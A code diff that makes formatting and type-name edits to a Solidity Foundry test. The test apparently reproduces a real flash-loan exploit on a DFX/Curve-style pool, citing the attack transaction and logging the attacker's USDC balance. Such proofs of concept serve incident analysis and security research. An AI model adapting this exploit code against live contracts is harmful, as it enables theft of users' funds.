@@ -13,13 +13,16 @@ import "./../interface.sol";
 // https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
 
 interface Curve {
+
     function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
     function viewDeposit(uint256 _deposit) external view returns (uint256, uint256[] memory);
     function deposit(uint256 _deposit, uint256 _deadline) external returns (uint256, uint256[] memory);
     function withdraw(uint256 _curvesToBurn, uint256 _deadline) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 XIDR = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
@@ -46,7 +49,7 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("[Before] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 6);
 
         USDCToXIDR();
-        uint256[] memory XIDR_USDC = new uint[](2);
+        uint256[] memory XIDR_USDC = new uint256[](2);
         XIDR_USDC[0] = 0;
         XIDR_USDC[1] = 0;
         (, XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);
@@ -102,4 +105,5 @@ contract ContractTest is Test {
         });
         Router.exactInputSingle(_Params);
     }
+
 }
